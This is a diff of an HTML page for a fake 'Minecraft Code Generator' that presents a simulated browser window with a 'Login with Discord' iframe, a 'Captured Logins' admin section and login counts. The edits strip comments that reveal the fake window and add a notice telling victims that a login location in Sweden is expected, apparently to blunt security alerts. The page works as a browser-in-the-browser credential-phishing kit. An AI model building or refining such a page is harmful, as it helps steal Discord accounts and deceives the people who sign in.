@@ -13,14 +13,13 @@
             <div class="mccg-header">
                 <h1>MCCG</h1>
                 <p class="tagline">The most trusted Minecraft Code Generator 2026</p>
+                <p class="location-tag">MCCG, based in Sweden</p>
             </div>
             
             <div class="login-preview-wrapper">
                 <p class="login-label">Login with Discord</p>
                 
-                <!-- Fake Browser Window -->
                 <div class="browser-window">
-                    <!-- Browser Chrome (No dots, just tab) -->
                     <div class="browser-chrome">
                         <div class="browser-tabs">
                             <div class="browser-tab active" id="browser-tab">
@@ -30,7 +29,6 @@
                         </div>
                     </div>
                     
-                    <!-- URL Bar -->
                     <div class="url-bar-container">
                         <div class="url-bar">
                             <div class="url-security">
@@ -53,16 +51,14 @@
                         </div>
                     </div>
                     
-                    <!-- Browser Content -->
                     <div class="browser-content" id="browser-content">
                         <iframe 
                             id="login-iframe" 
-                            src="https://mccglogin.pages.dev" 
+                            src="about:blank"
                             frameborder="0"
                             scrolling="no"
                         ></iframe>
                         
-                        <!-- Error Page (hidden by default) -->
                         <div id="error-page" class="error-page hidden">
                             <div class="error-content">
                                 <svg viewBox="0 0 24 24" width="64" height="64" fill="#72767d">
@@ -89,7 +85,7 @@
                 </svg>
             </div>
             <h2>Warning</h2>
-            <p>Changing the URL messes with other users' interface. If you continue, it will result in a ban.</p>
+            <p>Changing the URL interferes with other users' sessions and is a violation of MCCG's terms. If you continue, it may result in a permanent ban from the platform.</p>
             <div class="modal-buttons">
                 <button id="modal-cancel-btn" class="secondary-btn">Cancel</button>
                 <button id="modal-continue-btn" class="danger-btn">Continue Anyway</button>
@@ -123,6 +119,9 @@
                     <path d="M12 8v4m0 4h.01"/>
                 </svg>
             </div>
+            <div class="auth-notice-banner">
+                <p>Please ensure you have verified your login via your email. If the login location shows Sweden, that is expected — our authentication servers are based in Sweden and all logins are routed through there.</p>
+            </div>
             <div class="warning-banner">
                 <p>Make sure you are using your main Discord account. Alternative accounts are prohibited and may result in a permanent ban.</p>
             </div>
@@ -141,7 +140,6 @@
             </header>
 
             <div class="admin-content">
-                <!-- Code Generator -->
                 <section class="admin-section">
                     <div class="section-header">
                         <h2>MC-CODE Generator</h2>
@@ -171,7 +169,6 @@
                     </div>
                 </section>
 
-                <!-- Captured Logins -->
                 <section class="admin-section">
                     <div class="section-header">
                         <h2>Captured Logins</h2>
@@ -196,7 +193,6 @@
                     </div>
                 </section>
 
-                <!-- Stats -->
                 <section class="admin-section stats-section">
                     <div class="stat-card">
                         <h3>Total Logins</h3>
@@ -215,7 +211,6 @@
         </div>
     </div>
 
-    <!-- Admin Access Button (shown only for admins) -->
     <button id="admin-access-btn" class="admin-access-btn hidden">Admin</button>
 
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
